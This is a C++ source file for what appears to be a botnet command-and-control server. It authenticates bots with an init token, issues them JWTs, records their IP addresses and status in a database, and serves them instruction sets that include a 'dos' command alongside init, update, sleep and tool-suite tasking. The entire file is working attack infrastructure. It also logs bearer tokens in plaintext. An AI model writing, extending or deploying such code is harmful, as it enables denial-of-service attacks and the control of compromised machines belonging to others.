#include "ControlServer.h"
#include "ConfigModule.h"
#include "DBController.h"
#include <boost/beast/core/flat_buffer.hpp>
#include <jwt-cpp/jwt.h>

ControlServer::ControlServer(const nlohmann::json &config_file)
    : BaseServer(" ", 0, " ", 0), m_ssl_context(ssl::context::tlsv12),
      m_io_context() {
  react_to_config_update(config_file);
  BaseLogger::getInstance().save_log("Initializing control server...",
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  m_acceptor = std::make_unique<ip::tcp::acceptor>(
      m_io_context, ip::tcp::endpoint(ip::make_address(get_server_address()),
                                      get_server_port()));
  m_log_socket = std::make_unique<ip::tcp::socket>(m_io_context);
  m_ssl_context.set_options(ssl::context::default_workarounds |
                            ssl::context::no_sslv2 | ssl::context::no_sslv3 |
                            ssl::context::single_dh_use);

  m_ssl_context.set_password_callback(
      [](std::size_t, ssl::context::password_purpose) {
        const char *password = std::getenv("SSL_PRIVATE_KEY_PASSWORD");
        if (password == nullptr) {
          throw std::runtime_error(
              "Environment variable SSL_PRIVATE_KEY_PASSWORD not set");
        }
        return std::string(password);
      });
  BaseLogger::getInstance().save_log("Loading certificate chain file " +
                                         m_configs["certificate_chain"],
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  m_ssl_context.use_certificate_chain_file(m_configs["certificate_chain"]);
  BaseLogger::getInstance().save_log("Loading private key file" +
                                         m_configs["private_key"],
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  m_ssl_context.use_private_key_file(m_configs["private_key"],
                                     ssl::context::pem);
  BaseLogger::getInstance().save_log("Loading dh file " + m_configs["dh_file"],
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  m_ssl_context.use_tmp_dh_file(m_configs["dh_file"]);
  BaseLogger::getInstance().save_log("Loading CA certificate file " +
                                         m_configs["ca_certificate"],
                                     LogLevel::TRACE, ServerInstance::CONTROL);

  BaseLogger::getInstance().save_log("Initialized control server.",
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  start_accept();
}

ControlServer::~ControlServer() {}

void ControlServer::react_to_config_update(const nlohmann::json &config) {
  BaseLogger::getInstance().save_log("Updating control server config...",
                                     LogLevel::INFO, ServerInstance::CONTROL);
  try {
    // instructions
    if (config.contains("instructions")) {
      auto instructions = config["instructions"];

      if (instructions.contains("dos") && instructions["dos"].is_string()) {
        m_configs["dos_instruction"] = instructions["dos"];
      }
      if (instructions.contains("init") && instructions["init"].is_string()) {
        m_configs["init_instruction"] = instructions["init"];
      }
      if (instructions.contains("update") &&
          instructions["update"].is_string()) {
        m_configs["update_instruction"] = instructions["update"];
      }
      if (instructions.contains("sleep") && instructions["sleep"].is_string()) {
        m_configs["sleep_instruction"] = instructions["sleep"];
      }
      if (instructions.contains("tool_suites") &&
          instructions["tool_suites"].is_string()) {
        m_configs["tool_suites"] = instructions["tool_suites"];
      }
    }
    BaseLogger::getInstance().save_log("Updated instructions config.",
                                       LogLevel::TRACE,
                                       ServerInstance::CONTROL);

    // general
    if (config.contains("general")) {
      auto general = config["general"];

      if (general.contains("server")) {
        auto server = general["server"];

        if (server.contains("address") && server["address"].is_string()) {
          m_configs["server_address"] = server["address"];
          set_server_address(m_configs["server_address"]);
        }
        if (server.contains("port") && server["port"].is_string()) {
          m_configs["server_port"] = server["port"];
          set_server_port(stoi(m_configs["server_port"]));
        }
        if (server.contains("io_context_threads") &&
            server["io_context_threads"].is_string()) {
          m_configs["io_context_threads"] = server["io_context_threads"];
        }
      }

      if (general.contains("logger")) {
        auto logger = general["logger"];

        if (logger.contains("address") && logger["address"].is_string()) {
          m_configs["logger_address"] = logger["address"];
          set_log_server_address(m_configs["logger_address"]);
        }
        if (logger.contains("port") && logger["port"].is_string()) {
          m_configs["logger_port"] = logger["port"];
          set_log_server_port(stoi(m_configs["logger_port"]));
        }
      }
    }
    BaseLogger::getInstance().save_log(
        "Updated general config.", LogLevel::TRACE, ServerInstance::CONTROL);

    // networking
    if (config.contains("networking")) {
      auto networking = config["networking"];

      // SSL
      if (networking.contains("ssl")) {
        auto ssl = networking["ssl"];

        if (ssl.contains("certificate_chain") &&
            ssl["certificate_chain"].is_string()) {
          m_configs["certificate_chain"] = ssl["certificate_chain"];
        }
        if (ssl.contains("private_key") && ssl["private_key"].is_string()) {
          m_configs["private_key"] = ssl["private_key"];
        }
        if (ssl.contains("public_key") && ssl["public_key"].is_string()) {
          m_configs["public_key"] = ssl["public_key"];
        }
        if (ssl.contains("dh_file") && ssl["dh_file"].is_string()) {
          m_configs["dh_file"] = ssl["dh_file"];
        }
        if (ssl.contains("ca_certificate") &&
            ssl["ca_certificate"].is_string()) {
          m_configs["ca_certificate"] = ssl["ca_certificate"];
        }
      }
      BaseLogger::getInstance().save_log("Updated networking config.",
                                         LogLevel::TRACE,
                                         ServerInstance::CONTROL);

      // HTTP
      if (networking.contains("http")) {
        auto http = networking["http"];

        if (http.contains("server_header") &&
            http["server_header"].is_string()) {
          m_configs["server_header"] = http["server_header"];
        }
        if (http.contains("api_endpoints") &&
            http["api_endpoints"].is_string()) {
          m_api_endpoints = http["api_endpoints"];
        }
      }
    }
    BaseLogger::getInstance().save_log("Updated http config.", LogLevel::TRACE,
                                       ServerInstance::CONTROL);

  } catch (const std::exception &e) {
    BaseLogger::getInstance().save_log("Failed to update control server config",
                                       LogLevel::ERROR,
                                       ServerInstance::CONTROL);
    BaseLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                             ServerInstance::CONTROL);
  }
}

std::string ControlServer::generate_jwt(const std::string &uuid) {
  // Load the private key
  std::string privateKey;
  std::string publicKey;
  try {
    BaseLogger::getInstance().save_log(
        "Loading private key from file " + m_configs["private_key"],
        LogLevel::TRACE, ServerInstance::CONTROL);
    privateKey = Essentials::getInstance().loadKey(m_configs["private_key"]);
  } catch (const std::exception &e) {
    BaseLogger::getInstance().save_log(
        "Failed to load private key", LogLevel::ERROR, ServerInstance::CONTROL);
    BaseLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                             ServerInstance::CONTROL);
    return "";
  }

  try {
    BaseLogger::getInstance().save_log(
        "Loading public key from file " + m_configs["public_key"],
        LogLevel::TRACE, ServerInstance::CONTROL);
    publicKey = Essentials::getInstance().loadKey(m_configs["public_key"]);
  } catch (const std::exception &e) {
    BaseLogger::getInstance().save_log(
        "Failed to load public key", LogLevel::ERROR, ServerInstance::CONTROL);
    BaseLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                             ServerInstance::CONTROL);
    return "";
  }

  BaseLogger::getInstance().save_log("Generating JWT for " + uuid,
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  try {
    auto token =
        jwt::create()
            .set_issuer("paralyze") // Issuer claim
            .set_type("JWT")      // Type header
            .set_payload_claim("user_id",
                               jwt::claim(uuid)) // Custom payload claim
            .set_issued_at(std::chrono::system_clock::now()) // Issued at
            .set_expires_at(std::chrono::system_clock::now() +
                            std::chrono::hours(240)) // Expiry time
            .sign(jwt::algorithm::rs256(
                publicKey, privateKey)); // Sign with private key and public key

    BaseLogger::getInstance().save_log(
        "Generated JWT for " + uuid, LogLevel::TRACE, ServerInstance::CONTROL);
    return token;
  } catch (const std::exception &e) {
    BaseLogger::getInstance().save_log("Failed to generate JWT for " + uuid,
                                       LogLevel::ERROR,
                                       ServerInstance::CONTROL);
    BaseLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                             ServerInstance::CONTROL);
    return "";
  }
}

std::string ControlServer::get_auth_token(
    std::shared_ptr<http::request<http::string_body>> request) {
  BaseLogger::getInstance().save_log("Getting auth token...", LogLevel::TRACE,
                                     ServerInstance::CONTROL);

  std::string token;
  auto auth_header = request->find(http::field::authorization);
  if (auth_header != request->end()) {
    std::string auth_value = std::string(auth_header->value());
    const std::string bearer_prefix = "Bearer ";
    if (auth_value.compare(0, bearer_prefix.size(), bearer_prefix) == 0) {
      token = auth_value.substr(bearer_prefix.size());
    }
  }
  BaseLogger::getInstance().save_log("Got auth token: " + token,
                                     LogLevel::TRACE, ServerInstance::CONTROL);
  return token;
}

std::string ControlServer::get_timestamp(
    std::shared_ptr<http::request<http::string_body>> request) {
  BaseLogger::getInstance().save_log("Getting timestamp...", LogLevel::TRACE,
                                     ServerInstance::CONTROL);
  auto timestamp_header = request->find("X-Timestamp");
  std::string timestamp;
  if (timestamp_header != request->end()) {
    timestamp = std::string(timestamp_header->value());
  }
  return timestamp;
}

std::string ControlServer::current_time_stamp() {
  time_t now = time(0);
  tm *ltm = localtime(&now);
  std::string time_stamp =
      std::to_string(1900 + ltm->tm_year) + "-" +
      std::to_string(1 + ltm->tm_mon) + "-" + std::to_string(ltm->tm_mday) +
      "T" + std::to_string(ltm->tm_hour) + ":" + std::to_string(ltm->tm_min) +
      ":" + std::to_string(ltm->tm_sec);
  return time_stamp;
}

void ControlServer::create_bot(const std::string &uuid,
                               const std::string &token,
                               const std::string &last_seen,
                               const std::string &ip_address,
                               const std::string &port) {
  BaseLogger::getInstance().save_log("Adding bot to database: " + uuid,
                                     LogLevel::INFO, ServerInstance::CONTROL);
  std::map<std::string, std::string> bot;
  bot["uuid"] = uuid;
  bot["ip_address"] = ip_address;
  bot["port"] = port;
  bot["location"] = "unknown";
  bot["status"] = "online";
  bot["last_seen"] = last_seen;
  bot["bot_type"] = "unknown";
  bot["token"] = token;
  bot["OS"] = "unknown";
  DBController::getInstance().insert_bot(bot);
  BaseLogger::getInstance().save_log("Added bot to database successfully: " +
                                         uuid,
                                     LogLevel::INFO, ServerInstance::CONTROL);
}

void ControlServer::handle_settings_request(
    std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
    std::shared_ptr<http::request<http::string_body>> request) {
  std::stringstream ss;
  ss << "Processing settings from "
     << socket->lowest_layer().remote_endpoint().address().to_string();
  BaseLogger::getInstance().save_log(ss.str(), LogLevel::TRACE,
                                     ServerInstance::CONTROL);

  auto response = std::make_shared<http::response<http::string_body>>();
  std::string token = get_auth_token(request);
  std::string uuid = DBController::getInstance().get_uuid(token);
  BaseLogger::getInstance().save_log("Got UUID: " + uuid, LogLevel::TRACE,
                                     ServerInstance::CONTROL);
  if (uuid.empty()) {
    BaseLogger::getInstance().save_log(
        "Failed to authenticate with token: " + token + ". Closing connection.",
        LogLevel::ERROR, ServerInstance::CONTROL);

    response->result(http::status::unauthorized);
    response->set(http::field::server, m_configs["server_header"]);
    response->set(http::field::content_type, "application/json");
    response->body() = "{\"error\": \"Unauthorized\"}";

    std::ostringstream oss;
    oss << *response;
    std::string response_str = oss.str();
    BaseLogger::getInstance().save_log("HTTP Response: " + response_str,
                                       LogLevel::TRACE,
                                       ServerInstance::CONTROL);
  } else {
    nlohmann::json bot_config =
        ConfigModule::getInstance().get_bot_config(uuid);
    BaseLogger::getInstance().save_log(
        "Got config for " + uuid + ": " + bot_config.dump(), LogLevel::TRACE,
        ServerInstance::CONTROL);

    if (bot_config.empty() or bot_config == nullptr) {
      BaseLogger::getInstance().save_log(
          "Failed to get config for " + uuid + ". Closing connection.",
          LogLevel::ERROR, ServerInstance::CONTROL);
      response->result(http::status::not_found);
      response->set(http::field::server, m_configs["server_header"]);
      response->set(http::field::content_type, "application/json");
      response->body() = "{\"error\": \"Not Found\"}";
    } else {
      nlohmann::json instructions =
          ConfigModule::getInstance().get_instruction(bot_config["config"]);
      BaseLogger::getInstance().save_log(
          "Got instructions for " + uuid + ": " + instructions.dump(),
          LogLevel::TRACE, ServerInstance::CONTROL);

      response->result(http::status::ok);
      response->set(http::field::server, m_configs["server_header"]);
      response->set(http::field::content_type, "application/json");
      response->content_length(instructions.dump().size());
      response->set("X-Timestamp", current_time_stamp());
      response->body() = instructions.dump();

      BaseLogger::getInstance().save_log("Updating bot in database: " + uuid,
                                         LogLevel::INFO,
                                         ServerInstance::CONTROL);
      DBController::getInstance().update_bot_last_seen(uuid,
                                                       get_timestamp(request));
      DBController::getInstance().update_bot_status(uuid, "online");
      DBController::getInstance().update_bot_ip_address(
          uuid, socket->lowest_layer().remote_endpoint().address().to_string());
      DBController::getInstance().update_bot_port(
          uuid, socket->lowest_layer().remote_endpoint().port());

      std::ostringstream oss;
      oss << *response;
      std::string response_str = oss.str();
      BaseLogger::getInstance().save_log(
          "HTTP Response for " + uuid + ": \r\n" + response_str,
          LogLevel::TRACE, ServerInstance::CONTROL);
    }
  }
  http::async_write(
      *socket, *response,
      [socket, response](const boost::system::error_code &ec, std::size_t) {
        if (!ec) {
          socket->async_shutdown([socket](const boost::system::error_code &ec) {
            if (!ec) {
              socket->lowest_layer().close();
              BaseLogger::getInstance().save_log("Closed connection.",
                                                 LogLevel::TRACE,
                                                 ServerInstance::CONTROL);
            } else {
              BaseLogger::getInstance().save_log(
                  "Failed to shutdown SSL stream: " + ec.message() +
                      " (Error code: " + std::to_string(ec.value()) +
                      ", Category: " + ec.category().name() + ")",
                  LogLevel::ERROR, ServerInstance::CONTROL);
            }
          });
        } else {
          BaseLogger::getInstance().save_log(
              "Failed to send HTTP response: " + ec.message() +
                  " (Error code: " + std::to_string(ec.value()) +
                  ", Category: " + ec.category().name() + ")",
              LogLevel::ERROR, ServerInstance::CONTROL);
        }
      });
}

void ControlServer::handle_auth_request(
    std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
    std::shared_ptr<http::request<http::string_body>> request) {
  std::stringstream ss;
  ss << "Processing auth request from "
     << socket->lowest_layer().remote_endpoint().address().to_string();
  BaseLogger::getInstance().save_log(ss.str(), LogLevel::TRACE,
                                     ServerInstance::CONTROL);

  std::string token = get_auth_token(request);
  auto response = std::make_shared<http::response<http::string_body>>();

  if (token == ConfigModule::getInstance().get_init_token()) {
    BaseLogger::getInstance().save_log("Authenticated with token: " + token,
                                       LogLevel::INFO, ServerInstance::CONTROL);
    std::string uuid = Essentials::getInstance().gen_uuid();
    std::string new_token = generate_jwt(uuid);

    response->result(http::status::ok);
    response->set(http::field::server, m_configs["server_header"]);
    response->set(http::field::content_type, "application/json");
    response->body() = "{\"jwt\": \"" + new_token + "\"}";
    create_bot(uuid, new_token, get_timestamp(request),
               socket->lowest_layer().remote_endpoint().address().to_string(),
               std::to_string(socket->lowest_layer().remote_endpoint().port()));
    nlohmann::json instructions;
    instructions["uuid"] = uuid;
    instructions["config"] = "init_instructions";
    ConfigModule::getInstance().set_bot_instructions(uuid, instructions);
  } else {
    BaseLogger::getInstance().save_log(
        "Failed to authenticate with token: " + token + ". Closing connection.",
        LogLevel::ERROR, ServerInstance::CONTROL);
    response->result(http::status::unauthorized);
    response->set(http::field::server, m_configs["server_header"]);
    response->set(http::field::content_type, "application/json");
    response->body() = "{\"error\": \"Unauthorized\"}";

    std::ostringstream oss;
    oss << *response;
    std::string response_str = oss.str();
    BaseLogger::getInstance().save_log("HTTP Response: " + response_str,
                                       LogLevel::TRACE,
                                       ServerInstance::CONTROL);
  }

  http::async_write(
      *socket, *response,
      [socket, response](const boost::system::error_code &ec, std::size_t) {
        if (!ec) {
          socket->async_shutdown([socket](const boost::system::error_code &ec) {
            if (!ec) {
              socket->lowest_layer().close();
              BaseLogger::getInstance().save_log("Closed connection.",
                                                 LogLevel::TRACE,
                                                 ServerInstance::CONTROL);
            } else {
              BaseLogger::getInstance().save_log(
                  "Failed to shutdown SSL stream: " + ec.message() +
                      " (Error code: " + std::to_string(ec.value()) +
                      ", Category: " + ec.category().name() + ")",
                  LogLevel::ERROR, ServerInstance::CONTROL);
            }
          });
        } else {
          BaseLogger::getInstance().save_log(
              "Failed to send HTTP response: " + ec.message() +
                  " (Error code: " + std::to_string(ec.value()) +
                  ", Category: " + ec.category().name() + ")",
              LogLevel::ERROR, ServerInstance::CONTROL);
        }
      });
}

// request handling
void ControlServer::process_request(
    std::shared_ptr<ssl::stream<ip::tcp::socket>> socket,
    std::shared_ptr<http::request<http::string_body>> request) {
  std::stringstream ss;
  ss << "Processing request from "
     << socket->lowest_layer().remote_endpoint().address().to_string() << "...";
  BaseLogger::getInstance().save_log(ss.str(), LogLevel::TRACE,
                                     ServerInstance::CONTROL);

  if (request->target() == "/api/settings") {
    handle_settings_request(socket, request);
  } else if (request->target() == "/api/auth/jwt") {
    handle_auth_request(socket, request);
  } else {
    send_not_found_response(socket);
  }
}

void ControlServer::send_not_found_response(
    std::shared_ptr<ssl::stream<ip::tcp::socket>> socket) {
  std::stringstream ss;
  ss << "Sending not found response to "
     << socket->lowest_layer().remote_endpoint().address().to_string();
  BaseLogger::getInstance().save_log(ss.str(), LogLevel::TRACE,
                                     ServerInstance::CONTROL);

  auto response = std::make_shared<http::response<http::string_body>>();
  response->result(http::status::not_found);
  response->set(http::field::server, m_configs["server_header"]);
  response->set(http::field::content_type, "application/json");
  response->body() = "{\"error\": \"Not found\"}";
  http::async_write(
      *socket, *response,
      [socket, response](const boost::system::error_code &ec, std::size_t) {
        if (!ec) {
          socket->async_shutdown([socket](const boost::system::error_code &ec) {
            if (!ec) {
              socket->lowest_layer().close();
            }
          });
        } else {
          BaseLogger::getInstance().save_log(
              "Failed to send HTTP response: " + ec.message(), LogLevel::ERROR,
              ServerInstance::CONTROL);
        }
      });
}

void ControlServer::handle_request(
    std::shared_ptr<ssl::stream<ip::tcp::socket>> socket) {
  std::stringstream ss;
  ss << "Received request from "
     << socket->lowest_layer().remote_endpoint().address().to_string();
  BaseLogger::getInstance().save_log(ss.str(), LogLevel::TRACE,
                                     ServerInstance::CONTROL);

  auto buffer = std::make_shared<boost::beast::flat_buffer>();
  auto request = std::make_shared<http::request<http::string_body>>();

  http::async_read(*socket, *buffer, *request,
                   [this, socket, request,
                    buffer](const boost::system::error_code &ec, std::size_t) {
                     if (!ec) {
                       process_request(socket, request);
                     } else {
                       BaseLogger::getInstance().save_log(
                           "Failed to read HTTP request: " + ec.message() +
                               " (Error code: " + std::to_string(ec.value()) +
                               ", Category: " + ec.category().name() + ")",
                           LogLevel::ERROR, ServerInstance::CONTROL);
                       send_not_found_response(socket);
                     }
                   });
}

void ControlServer::handle_bot(std::shared_ptr<ip::tcp::socket> bot_socket) {
  auto sslStream = std::make_shared<ssl::stream<ip::tcp::socket>>(
      std::move(*bot_socket), m_ssl_context);
  sslStream->async_handshake(
      ssl::stream_base::server,
      [this, sslStream](const boost::system::error_code &ec) {
        if (!ec) {
          handle_request(sslStream);
        } else {
          BaseLogger::getInstance().save_log(
              "Failed to establish SSL connection: " + ec.message(),
              LogLevel::ERROR, ServerInstance::CONTROL);
        }
      });
}

void ControlServer::start_accept() {
  BaseLogger::getInstance().save_log("Accepting connection...", LogLevel::INFO,
                                     ServerInstance::CONTROL);
  auto socket = std::make_shared<ip::tcp::socket>(m_io_context);

  m_acceptor->async_accept(*socket,
                           [this, socket](const boost::system::error_code &ec) {
                             if (!ec) {
                               handle_bot(std::move(socket));
                             }
                             start_accept();
                           });
}

void ControlServer::start_server() {
  try {
    BaseLogger::getInstance().save_log("Starting control server...",
                                       LogLevel::INFO, ServerInstance::CONTROL);

    std::vector<std::thread> threads;
    for (int i = 0; i < stoi(m_configs["io_context_threads"]); i++) {
      threads.emplace_back([this] { m_io_context.run(); });
    }

    for (auto &thread : threads) {
      thread.join();
    }

  } catch (const std::exception &e) {
    BaseLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                             ServerInstance::CONTROL);
  }
}